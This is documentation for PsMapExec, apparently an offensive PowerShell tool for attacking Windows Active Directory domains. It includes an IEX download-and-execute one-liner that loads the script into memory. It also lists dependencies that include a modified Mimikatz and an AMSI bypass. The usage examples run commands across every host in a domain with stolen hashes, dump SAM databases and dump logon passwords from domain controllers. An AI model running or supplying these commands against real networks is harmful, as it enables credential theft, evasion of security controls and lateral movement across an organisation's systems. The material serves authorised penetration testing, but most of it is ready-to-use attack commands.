# âš¡ PsMapExec

**Get it on GitHub:** [https://github.com/The-Viper-One/PsMapExec](https://github.com/The-Viper-One/PsMapExec)

**Load directly into memory:**

```powershell
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```

## General Usage

The general usage of PsMapExec is to define the following:

* Targets - Which targets we cant to run against
* Username - Domain user for which we wish to authenticate against the targets
* Password - Used for authentication
* Hash - Used for authentication. You can supply either a hash or a password.&#x20;
* Method - How to authenticate against the hosts
* Module - (Optional) If any modules need to be run against the target
* Option - (Optional) Provide further commands to select modules
* Command - (Optional) execute commands against the target
* Threads - Specify the number of concurrent jobs against hosts (Default 20)

Most of these have additional documentation that delves into more detail about each (Available on the lefthand sidebar of this page).

Generally, you can mix and match various parameters across different methods and modules.

## Dependencies

PsMapExec has some dependencies that need to be pulled from outside the script itself in order to function.

Primarily these are:

* Powerview
* DumpSAM
* Invoke-Pandemonium (Slightly modified Mimikatz)
* Invoke-Mongoose (AMSI Bypass)

Currently, they are pulled from a seperate GitHub repository: [https://github.com/The-Viper-One/PME-Scripts](https://github.com/The-Viper-One/PME-Scripts)

If you are working within an environment that has no external access or GitHub is blocked by a firewall you will need to clone the scripts in the respository onto the system from which PsMapExec is running from.\
\
PsMapExec does not currently host a HTTP server for these so you will need to use something like HFS: [https://www.rejetto.com/hfs/?f=dl](https://www.rejetto.com/hfs/?f=dl)

PsMapExec supports pointing to a locally or alternatively hosted server for the script dependencies.

```powershell
PsMapExec -Targets All -Username [User] -Password [Pass] -LocalFileServer [IP]
```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

## Examples

Execute WMI commands over all systems in the domain using password authentication

```
PsMapExec -Username Admin -Password Pass -Targets All -Method WMI -Command "net user"
```

Execute WinRM commands over all systems in the domain using hash authentication

```
PsMapExec -Username Admin -Hash [Hash] -Targets All -Method WinRM -Command "net user"
```

Check RDP Access against workstations in the domain

```
PsMapExec -Username Admin -Password Pass -Targets Workstations -Method RDP
```

Dump SAM on all servers in the domain using PsExec

```
PsMapExec -Username Admin -Hash [Hash] -Targets Servers -Method PsExec -Module SAM
```

Check SMB Signing on all domain systems

```
PsMapExec -Targets All -GenRelayList
```

Dump LogonPasswords on all Domain Controllers over WinRM

```
PsMapExec -Username Admin -Password Pass -Targets DCs -Method WinRM -Module LogonPasswords
```
